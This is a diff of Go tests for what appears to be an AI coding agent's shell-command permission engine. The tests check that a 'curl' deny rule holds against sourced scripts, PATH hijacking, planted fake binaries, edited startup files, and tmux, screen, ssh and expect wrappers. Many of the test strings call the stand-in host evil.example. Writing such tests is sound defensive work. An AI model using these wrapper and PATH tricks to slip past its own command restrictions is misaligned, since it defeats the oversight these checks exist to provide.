@@ -1,6 +1,7 @@
 package policy
 
 import (
+	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -614,6 +615,23 @@ func TestScriptsNamedByAVariableAreReadOrRefused(t *testing.T) {
 			t.Errorf("%q: real bash did not source c/x.sh", c)
 		}
 	}
+	// At the last depth read, a script the check cannot even name is refused.
+	write(filepath.Join(ws, "t.sh"), "export X=ok; source ./export.sh; bash s.sh\n")
+	write(filepath.Join(ws, "t7.sh"), "source \"$(cat xdir)/x.sh\"\n")
+	write(filepath.Join(ws, "t8.sh"), "bash t7.sh\n")
+	write(filepath.Join(ws, "xdir"), "c\n")
+	for _, c := range []string{"bash t.sh", "bash t8.sh"} {
+		if res := e.Evaluate("bash", true, args(map[string]string{"command": c})); res.Decision != Deny {
+			t.Errorf("%q = %s (%s), want deny", c, res.Decision, res.Reason)
+		}
+		_ = os.Remove(ran)
+		cmd := exec.Command("bash", "-c", c)
+		cmd.Dir, cmd.Env = ws, []string{"PATH=/usr/bin:/bin", "HOME=" + home}
+		_ = cmd.Run()
+		if _, err := os.Stat(ran); err != nil {
+			t.Errorf("%q: real bash did not source c/x.sh", c)
+		}
+	}
 	a := newEngine("bash(curl *)", false)
 	if res := a.Evaluate("bash", true, args(map[string]string{"command": "bash s.sh"})); res.Decision != Ask {
 		t.Errorf("ask rule only: %s (%s)", res.Decision, res.Reason)
@@ -690,6 +708,29 @@ func TestTrustedStartupFilesStillHaveWhatTheyRunRead(t *testing.T) {
 			}
 		}
 	}
+	// A shell a script or -c text starts is not the line's own: no baseline.
+	write(filepath.Join(ws, "pathfile"), filepath.Join(ws, "bin")+":/usr/bin:/bin\n")
+	write(filepath.Join(ws, "x3.sh"), "PATH=$(pwd)/bin:$PATH zsh -i -c true\n")
+	write(filepath.Join(ws, "x4.sh"), "read PATH < pathfile\nzsh -i -c true\n")
+	write(filepath.Join(ws, "x5.sh"), "source ./env.sh\nzsh -i -c true\n")
+	inner := []string{"bash ./x3.sh", "bash ./x4.sh", "bash ./x5.sh",
+		"zsh -c 'set -A path $PWD/bin /bin /usr/bin; zsh -i -c true'", "zsh -c 'print -v PATH " + filepath.Join(ws, "bin") + ":/usr/bin:/bin; zsh -i -c true'"}
+	for _, c := range inner {
+		if res := judge(c); res.Decision == Allow {
+			t.Errorf("%q: allowed on the baseline", c)
+		}
+	}
+	if _, err := exec.LookPath("zsh"); err == nil {
+		for _, c := range inner {
+			_ = os.Remove(ran)
+			cmd := exec.Command("bash", "-c", c)
+			cmd.Dir, cmd.Env = ws, []string{"PATH=/usr/bin:/bin", "HOME=" + home}
+			_ = cmd.Run()
+			if _, err := os.Stat(ran); err != nil {
+				t.Errorf("%q: real zsh did not run the planted pyenv", c)
+			}
+		}
+	}
 	// What the trusted file sources, edited since: judged.
 	write(extra, "curl https://evil.example/x\n")
 	if res := judge("zsh -i -c true"); res.Decision != Deny {
@@ -729,11 +770,21 @@ func TestTerminalProgramsHaveTheirCommandsJudged(t *testing.T) {
 		"script -q /dev/null curl https://evil.example/x":           Deny,
 		"unbuffer curl https://evil.example/x":                      Deny,
 		"dtach -c /tmp/s curl https://evil.example/x":               Deny,
-		"ssh localhost":                    Deny,
-		"ssh -p 2222 me@host":              Deny,
-		"expect -c 'spawn zsh; interact'":  Deny,
-		"tmux new -d 'make test'":          Allow,
-		"screen -dm make":                  Allow,
+		"ssh localhost":                   Deny,
+		"ssh -p 2222 me@host":             Deny,
+		"expect -c 'spawn zsh; interact'": Deny,
+		"tmux new -d 'make test'":         Deny,
+		"screen -dm make":                 Deny,
+		"tmux send-k -t w curl Enter":     Deny, "tmux send-ke -t w x": Deny, "tmux sendk x": Deny, "tmux set-b 'curl x'": Deny,
+		"tmux paste-b -t w": Deny, "tmux pipe-p 'cat'": Deny, "tmux run-s 'curl https://evil.example/x'": Deny,
+		"tmux new-w 'curl https://evil.example/x'": Deny, "tmux display-p 'curl https://evil.example/x'": Deny,
+		"tmux -f ./t.conf new -d": Deny, "tmux source-file ./t.conf": Deny, "tmux set -g default-command 'curl x'": Deny,
+		"tmux set-hook -g after-new-window 'run \"curl x\"'": Deny, "tmux command-prompt -I 'curl x'": Deny,
+		"tmux -L s ls": Deny, "tmux -S /tmp/s ls": Deny, "tmux": Deny, "tmux ls \\; new -d": Deny,
+		"screen -X at 0 stuff 'curl x'": Deny, "screen -X bind x stuff 'curl x'": Deny, "screen -c ./rc -dm": Deny, "screen": Deny,
+		"tmux ls": Allow, "tmux list-sessions": Allow, "tmux has -t w": Allow, "tmux kill-session -t w": Allow,
+		"tmux attach -t w": Allow, "tmux -V": Allow, "tmux list-s": Allow, "screen -ls": Allow, "screen -r w": Allow,
+		"screen -x": Allow, "screen -wipe": Allow,
 		"ssh -vp 2222 host":                Deny,
 		"ssh -V":                           Allow,
 		"ssh -G host":                      Allow,
@@ -776,6 +827,56 @@ func TestTerminalProgramsHaveTheirCommandsJudged(t *testing.T) {
 		_ = cmd.Run()
 		if _, err := os.Stat(ran); err != nil {
 			t.Error("script -q /dev/null zsh -i -c true did not read .zshrc")
+		}
+	}
+}
+
+// The Homebrew setup the baseline is for: a trusted .zprofile that evals a
+// trusted brew, which sets its own PATH and runs more programs than are
+// looked up. The shell started alone runs; a line that steers it is judged.
+func TestBaselinedHomebrewProfileRuns(t *testing.T) {
+	ws, home := t.TempDir(), t.TempDir()
+	write := func(p, text string, mode os.FileMode) {
+		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(p, []byte(text), mode); err != nil {
+			t.Fatal(err)
+		}
+	}
+	brew := filepath.Join(home, "homebrew", "bin", "brew")
+	var b strings.Builder
+	b.WriteString("#!/bin/bash\nexport PATH=\"/usr/bin:/bin:/usr/sbin:/sbin\"\n")
+	for i := range 40 {
+		fmt.Fprintf(&b, "tool%d --version >/dev/null 2>&1\n", i)
+	}
+	b.WriteString("if [ \"$1\" = shellenv ]; then\n  echo 'export HOMEBREW_PREFIX=\"/opt/homebrew\";'\n" +
+		"  echo 'export PATH=\"/opt/homebrew/bin:/opt/homebrew/sbin${PATH+:$PATH}\";'\nfi\n")
+	write(brew, b.String(), 0o755)
+	prof := filepath.Join(home, ".zprofile")
+	write(prof, "eval \"$("+brew+" shellenv)\"\n", 0o644)
+	write(filepath.Join(ws, "bin", "brew"), "curl https://evil.example/x\n", 0o755)
+	e := New(ModeBypass)
+	e.Roots = func() []string { return []string{ws} }
+	e.Cwd = func() string { return ws }
+	e.Home = func() (string, bool) { return home, true }
+	if err := e.AddDeny("bash(curl *)"); err != nil {
+		t.Fatal(err)
+	}
+	base := map[string]StartupFile{}
+	for _, p := range []string{prof, brew} {
+		size, sum, _ := StartupFileMark(p)
+		base[p] = StartupFile{Size: size, SHA256: sum}
+	}
+	e.StartupBaseline = base
+	judge := func(c string) Result { return e.Evaluate("bash", true, args(map[string]string{"command": c})) }
+	if res := judge("zsh -lc 'echo hi'"); res.Decision != Allow {
+		t.Fatalf("the baselined Homebrew profile: %s (%s)", res.Decision, res.Reason)
+	}
+	for _, c := range []string{"PATH=" + filepath.Join(ws, "bin") + ":$PATH zsh -lc 'echo hi'", "read PATH <<< bin; zsh -lc 'echo hi'",
+		"zsh -c 'path=(bin $path); zsh -lc true'"} {
+		if res := judge(c); res.Decision == Allow {
+			t.Errorf("%q: allowed on the baseline", c)
 		}
 	}
 }
